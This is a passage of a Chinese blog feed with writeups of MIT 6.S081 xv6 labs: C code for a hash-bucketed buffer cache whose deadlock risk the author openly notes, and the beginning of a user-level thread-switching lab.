class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">bpin</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b)</span> &#123;<br>    <span class="hljs-type">int</span> key = b-&gt;blockno % prime;<br>    LOCK(key);<br>    b-&gt;refcnt++;<br>    UNLOCK(key);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bunpin</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b)</span> &#123;<br>    <span class="hljs-type">int</span> key = b-&gt;blockno % prime;<br>    LOCK(key);<br>    b-&gt;refcnt--;<br>    UNLOCK(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>大头戏<code>bget</code>来了</p><ol><li>首先通过<code>search_in_ht</code>尝试去找找这个block是不是已经被读入了某个buf里，这种情况如果成功，那就和之前<code>bget</code>前一部分逻辑一模一样</li><li>如果失败了，那么就需要通过<code>search_in_other</code>去整个哈希表中找一个空闲的buf，这个操作一定会成功，否则在xv6里就直接给它来一个panic，原函数也是这么写的</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> buf *<br><span class="hljs-title function_">bget</span><span class="hljs-params">(uint dev, uint blockno)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">b</span>;</span><br>    <span class="hljs-type">int</span> key = blockno % prime;<br>    <span class="hljs-comment">// 尝试去对应的哈希表槽查找</span><br>    LOCK(key);<br>    b = search_in_ht(dev, blockno, key);<br>    <span class="hljs-keyword">if</span> (b) &#123;<br>        UNLOCK(key);<br>        acquiresleep(&amp;b-&gt;lock);<br>        <span class="hljs-keyword">return</span> b;<br>    &#125;<br>    <span class="hljs-comment">// 至此，没有在对应的表槽找到，遍历所有哈希表的表槽，不过优先处理自己表槽的</span><br>    <span class="hljs-comment">// 这里是带着key对应的锁去查找的</span><br>    b = search_in_other(dev, blockno, key);<br>    <span class="hljs-comment">// 这个b不可能为0，否则直接panic了</span><br>    UNLOCK(key);<br>    acquiresleep(&amp;b-&gt;lock);<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>search_in_ht</code>的实现如下所示，就是遍历链表，如果找到了，更新属性，然后返回。其中更新属性会用到<code>update_time</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">update_time</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b)</span> &#123;<br>    acquire(&amp;tickslock);<br>    b-&gt;timestamp = ticks;<br>    release(&amp;tickslock);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> buf *<span class="hljs-title function_">search_in_ht</span><span class="hljs-params">(uint dev, uint blockno, <span class="hljs-type">int</span> key)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">b</span>;</span><br>    <span class="hljs-keyword">for</span> (b = ht[key].head.next; b != &amp;ht[key].head; b = b-&gt;next) &#123;<br>        <span class="hljs-keyword">if</span> (b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno) &#123;<br>            b-&gt;refcnt++;<br>            update_time(b);<br>            <span class="hljs-keyword">return</span> b;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>而<code>search_in_other</code>就比较复杂</p><ol><li><p>这里采取的遍历顺序是从自己这里开始遍历，用一个cycle来控制遍历prime次，之所以这样做，是为了避免每次都是0开始遍历。这样操作相对来说会提高点性能，不会出现前面的表槽没有空闲的，后面的表槽全是空闲的</p></li><li><p>如果我们要进入的某个表槽不是自己，那么就需要获取那个表槽的锁</p><ol><li>这里是有可能死锁的<ol><li>因为我们进入这个函数的时候，是带着key对应的锁的，现在又去请求i对应的锁</li><li>假如某个cpu是带着i对应的锁进入这个函数，正在请求key对应的锁，岂不是就死锁了？</li><li>感觉是自带的评测没有检查出来，这里还是有点问题的。不过懒得改了</li></ol></li></ol></li><li><p>接下来就是通过<code>search_lru_free_in_ht</code>去这个兄弟那里找一找有没有空闲的</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> buf *<span class="hljs-title function_">search_lru_free_in_ht</span><span class="hljs-params">(uint dev, uint blockno, <span class="hljs-type">int</span> key)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">b</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">lru_b</span> =</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (b = ht[key].head.next; b != &amp;ht[key].head; b = b-&gt;next) &#123;<br>        <span class="hljs-keyword">if</span> (b-&gt;refcnt == <span class="hljs-number">0</span> &amp;&amp; (lru_b == <span class="hljs-number">0</span> || lru_b-&gt;timestamp &gt; b-&gt;timestamp)) &#123;<br>            lru_b = b;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> lru_b;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>如果没有，那么视情况释放锁，然后continue</p></li><li><p>如果有的话</p><ol><li>更新各种属性</li><li>如果这个buf是别的表槽，将这个buf挪到key对应的表槽</li><li>最后视情况释放这个兄弟锁，返回答案</li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> buf *<span class="hljs-title function_">search_in_other</span><span class="hljs-params">(uint dev, uint blockno, <span class="hljs-type">int</span> key)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">b</span>;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = key, cycle = <span class="hljs-number">0</span>; cycle &lt; prime; cycle++, i = (i + <span class="hljs-number">1</span>) % prime) &#123;<br>        <span class="hljs-comment">// 如果不是自己，则给这个兄弟上个锁</span><br>        <span class="hljs-keyword">if</span> (i != key) &#123;<br>            LOCK(i);<br>        &#125;<br>        <span class="hljs-comment">// 在这个兄弟里去找一下</span><br>        b = search_lru_free_in_ht(dev, blockno, i);<br>        <span class="hljs-comment">// 这个兄弟里没有空闲页面</span><br>        <span class="hljs-keyword">if</span> (!b) &#123;<br>            <span class="hljs-keyword">if</span> (i != key) &#123;<br>                UNLOCK(i);<br>            &#125;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">// 在这个兄弟里找到了空闲页面</span><br>        <span class="hljs-comment">// 先更新属性</span><br>        b-&gt;dev = dev;<br>        b-&gt;blockno = blockno;<br>        b-&gt;valid = <span class="hljs-number">0</span>;<br>        b-&gt;refcnt = <span class="hljs-number">1</span>;<br>        update_time(b);<br>        <span class="hljs-comment">// 如果不是自己的哈希槽里的，将这个页面放到自己哈希表槽中</span><br>        <span class="hljs-keyword">if</span> (i != key) &#123;<br>            delete_from_ht(b);<br>            insert_into_ht(b, key);<br>        &#125;<br>        <span class="hljs-comment">// 释放哈希表的锁</span><br>        <span class="hljs-keyword">if</span> (i != key) &#123;<br>            UNLOCK(i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> b;<br>    &#125;<br>    panic(<span class="hljs-string">&quot;no free buf&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>整体代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Buffer cache.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// The buffer cache is a linked list of buf structures holding</span><br><span class="hljs-comment">// cached copies of disk block contents.  Caching disk blocks</span><br><span class="hljs-comment">// in memory reduces the number of disk reads and also provides</span><br><span class="hljs-comment">// a synchronization point for disk blocks used by multiple processes.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Interface:</span><br><span class="hljs-comment">// * To get a buffer for a particular disk block, call bread.</span><br><span class="hljs-comment">// * After changing buffer data, call bwrite to write it to disk.</span><br><span class="hljs-comment">// * When done with the buffer, call brelse.</span><br><span class="hljs-comment">// * Do not use the buffer after calling brelse.</span><br><span class="hljs-comment">// * Only one process at a time can use a buffer,</span><br><span class="hljs-comment">//     so do not keep them longer than necessary.</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;param.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;spinlock.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sleeplock.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;riscv.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;defs.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fs.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;buf.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86_64-linux-gnu/sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prime 13</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> <span class="hljs-title">buf</span>[<span class="hljs-title">NBUF</span>];</span><br>&#125; bcache;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> <span class="hljs-title">head</span>;</span><br>&#125; ht[prime];<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOCK(i) (acquire(&amp;ht[i].lock));</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UNLOCK(i) (release(&amp;ht[i].lock));</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">update_time</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b)</span> &#123;<br>    acquire(&amp;tickslock);<br>    b-&gt;timestamp = ticks;<br>    release(&amp;tickslock);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">insert_into_ht</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b, <span class="hljs-type">int</span> key)</span> &#123;<br>    b-&gt;next = ht[key].head.next;<br>    b-&gt;prev = &amp;ht[key].head;<br>    ht[key].head.next-&gt;prev = b;<br>    ht[key].head.next = b;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_from_ht</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b)</span> &#123;<br>    b-&gt;next-&gt;prev = b-&gt;prev;<br>    b-&gt;prev-&gt;next = b-&gt;next;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">binit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">b</span>;</span><br><br>    <span class="hljs-type">char</span> a[<span class="hljs-number">20</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; prime; i++) &#123;<br>        <span class="hljs-built_in">snprintf</span>(a, <span class="hljs-keyword">sizeof</span>(a), <span class="hljs-string">&quot;bcache_%d&quot;</span>, i);<br>        initlock(&amp;ht[i].lock, a);<br>        ht[i].head.prev = &amp;ht[i].head;<br>        ht[i].head.next = &amp;ht[i].head;<br>    &#125;<br><br>    <span class="hljs-comment">// Create linked list of buffers</span><br>    <span class="hljs-keyword">for</span> (b = bcache.buf; b &lt; bcache.buf + NBUF; b++) &#123;<br>        initsleeplock(&amp;b-&gt;lock, <span class="hljs-string">&quot;buffer&quot;</span>);<br>        insert_into_ht(b, <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">struct</span> buf *<span class="hljs-title function_">search_in_ht</span><span class="hljs-params">(uint dev, uint blockno, <span class="hljs-type">int</span> key)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">b</span>;</span><br>    <span class="hljs-keyword">for</span> (b = ht[key].head.next; b != &amp;ht[key].head; b = b-&gt;next) &#123;<br>        <span class="hljs-keyword">if</span> (b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno) &#123;<br>            b-&gt;refcnt++;<br>            update_time(b);<br>            <span class="hljs-keyword">return</span> b;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">struct</span> buf *<span class="hljs-title function_">search_lru_free_in_ht</span><span class="hljs-params">(uint dev, uint blockno, <span class="hljs-type">int</span> key)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">b</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">lru_b</span> =</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (b = ht[key].head.next; b != &amp;ht[key].head; b = b-&gt;next) &#123;<br>        <span class="hljs-keyword">if</span> (b-&gt;refcnt == <span class="hljs-number">0</span> &amp;&amp; (lru_b == <span class="hljs-number">0</span> || lru_b-&gt;timestamp &gt; b-&gt;timestamp)) &#123;<br>            lru_b = b;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> lru_b;<br>&#125;<br><br><span class="hljs-keyword">struct</span> buf *<span class="hljs-title function_">search_in_other</span><span class="hljs-params">(uint dev, uint blockno, <span class="hljs-type">int</span> key)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">b</span>;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = key, cycle = <span class="hljs-number">0</span>; cycle &lt; prime; cycle++, i = (i + <span class="hljs-number">1</span>) % prime) &#123;<br>        <span class="hljs-comment">// 如果不是自己，则给这个兄弟上个锁</span><br>        <span class="hljs-keyword">if</span> (i != key) &#123;<br>            LOCK(i);<br>        &#125;<br>        <span class="hljs-comment">// 在这个兄弟里去找一下</span><br>        b = search_lru_free_in_ht(dev, blockno, i);<br>        <span class="hljs-comment">// 这个兄弟里没有空闲页面</span><br>        <span class="hljs-keyword">if</span> (!b) &#123;<br>            <span class="hljs-keyword">if</span> (i != key) &#123;<br>                UNLOCK(i);<br>            &#125;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">// 在这个兄弟里找到了空闲页面</span><br>        <span class="hljs-comment">// 先更新属性</span><br>        b-&gt;dev = dev;<br>        b-&gt;blockno = blockno;<br>        b-&gt;valid = <span class="hljs-number">0</span>;<br>        b-&gt;refcnt = <span class="hljs-number">1</span>;<br>        update_time(b);<br>        <span class="hljs-comment">// 如果不是自己的哈希槽里的，将这个页面放到自己哈希表槽中</span><br>        <span class="hljs-keyword">if</span> (i != key) &#123;<br>            delete_from_ht(b);<br>            insert_into_ht(b, key);<br>        &#125;<br>        <span class="hljs-comment">// 释放哈希表的锁</span><br>        <span class="hljs-keyword">if</span> (i != key) &#123;<br>            UNLOCK(i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> b;<br>    &#125;<br>    panic(<span class="hljs-string">&quot;no free buf&quot;</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> buf *<br><span class="hljs-title function_">bget</span><span class="hljs-params">(uint dev, uint blockno)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">b</span>;</span><br>    <span class="hljs-type">int</span> key = blockno % prime;<br>    <span class="hljs-comment">// 尝试去对应的哈希表槽查找</span><br>    LOCK(key);<br>    b = search_in_ht(dev, blockno, key);<br>    <span class="hljs-keyword">if</span> (b) &#123;<br>        UNLOCK(key);<br>        acquiresleep(&amp;b-&gt;lock);<br>        <span class="hljs-keyword">return</span> b;<br>    &#125;<br>    <span class="hljs-comment">// 至此，没有在对应的表槽找到，遍历所有哈希表的表槽，不过优先处理自己表槽的</span><br>    <span class="hljs-comment">// 这里是带着key对应的锁去查找的</span><br>    b = search_in_other(dev, blockno, key);<br>    <span class="hljs-comment">// 这个b不可能为0，否则直接panic了</span><br>    UNLOCK(key);<br>    acquiresleep(&amp;b-&gt;lock);<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br><br><span class="hljs-comment">// Return a locked buf with the contents of the indicated block.</span><br><span class="hljs-keyword">struct</span> buf *<br><span class="hljs-title function_">bread</span><span class="hljs-params">(uint dev, uint blockno)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">b</span>;</span><br><br>    b = bget(dev, blockno);<br>    <span class="hljs-keyword">if</span> (!b-&gt;valid) &#123;<br>        virtio_disk_rw(b, <span class="hljs-number">0</span>);<br>        b-&gt;valid = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br><br><span class="hljs-comment">// Write b&#x27;s contents to disk.  Must be locked.</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bwrite</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!holdingsleep(&amp;b-&gt;lock))<br>        panic(<span class="hljs-string">&quot;bwrite&quot;</span>);<br>    virtio_disk_rw(b, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// Release a locked buffer.</span><br><span class="hljs-comment">// Move to the head of the most-recently-used list.</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">brelse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b)</span> &#123;<br>    releasesleep(&amp;b-&gt;lock);<br>    <span class="hljs-type">int</span> key = b-&gt;blockno % prime;<br>    LOCK(key);<br>    b-&gt;refcnt -= <span class="hljs-number">1</span>;<br>    UNLOCK(key);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bpin</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b)</span> &#123;<br>    <span class="hljs-type">int</span> key = b-&gt;blockno % prime;<br>    LOCK(key);<br>    b-&gt;refcnt++;<br>    UNLOCK(key);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bunpin</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> buf *b)</span> &#123;<br>    <span class="hljs-type">int</span> key = b-&gt;blockno % prime;<br>    LOCK(key);<br>    b-&gt;refcnt--;<br>    UNLOCK(key);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.s081_lab7</title>
    <link href="/2023/08/25/6-s081-lab7/"/>
    <url>/2023/08/25/6-s081-lab7/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224204530.png" alt="20231224204530"></p><h1 id="Uthread-switching-between-threads"><a href="#Uthread-switching-between-threads" class="headerlink" title="Uthread: switching between threads"></a>Uthread: switching between threads</h1><p>在这个练习中，你将为一个用户级别线程系统设计上下文切换机制，并实现它。</p><h2 id="task"><a href="#task" class="headerlink" title="task"></a>task</h2><p>你的任务是提出一个计划，并实现它</p><ol><li>创造线程</li><li>切换线程的时候，保存和恢复寄存器</li></ol><p>当你完成的时候，<code>make grade</code>会显示你通过了<code>uthread</code>test</p><p>你将需要在<code>user/uthread.c</code>中的<code>thread_create()</code>和<code>thread_schedule()</code>，在<code>user/uthread_switch.S</code>的<code>thread_switch</code>添加代码</p><ol><li><p>一个目标是去保证，当<code>thread_schedule()</code>第一次运行一个线程时，这个线程会在它自己的栈上执行传递给<code>thread_create</code>的函数</p></li><li><p>另一个目标是去保证<code>thread_switch</code>保存被切换线程的寄存器，恢复被恢复线程的寄存器，并且到被恢复线程上次被中断的地方继续执行。</p></li><li><p>你将不得不决定将寄存器存放在哪里，修改<code>struct thread</code>去持有寄存器是不错的想法</p></li><li><p>你需要在<code>thread_schedule</code>调用<code>thread_switch</code></p></li><li><p>你可以传递任何你需要的参数给<code>thread_switch</code>，但是目标就是切换线程</p></li></ol><h2 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h2><ol><li><code>thread_switch</code>只需要保存和恢复被调用函数保护寄存器</li><li>你可以在<code>user/uthread.asm</code>中看到uthread的汇编代码</li></ol><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>代码非常少，主要是要搞清楚整个流程。线程的切换主要就是通过一个ra寄存器记录切换后函数从哪开始执行，通过一个sp寄存器记录切换之后栈的地址，然后就是一些被调用者保护寄存器。</p><blockquote><p>为什么只需要保存callee保护寄存器？</p><p>因为switch函数就是一个普通的c函数，在调用它的时候，调用函数会将调用者保护寄存器压入栈中保存，在它返回之后，会从&gt;栈中恢复被调用者保护寄存器。在switch结束之后，通过栈就可以恢复caller寄存器（这也是为什么要保存和恢复sp指针）。</p><p>而对于callee保护寄存器，就是被调用的函数来保护的了。也就是说，通过ra，sp以及callee保护寄存器，我们就可以恢复到某&gt;个线程的某个函数执行之后的镜像，缺一不可。</p><p>对于第一次被调度的进程，就更无所谓了，反正也不需要恢复什么caller和callee寄存器，本质上只需要ra和sp即可，但是为了统&gt;一写法，操作一下callee寄存器也没问题</p></blockquote><h3 id="上下文的恢复和保存"><a href="#上下文的恢复和保存" class="headerlink" title="上下文的恢复和保存"></a>上下文的恢复和保存</h3><p>而在我们的这个task中，线程切换时也要用到上述功能，因此需要模仿xv6构建一个context的结构体，并将其加入到thread的定义中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> &#123;</span><br>    uint64 ra;<br>    uint64 sp;<br><br>    <span class="hljs-comment">// callee-saved</span><br>    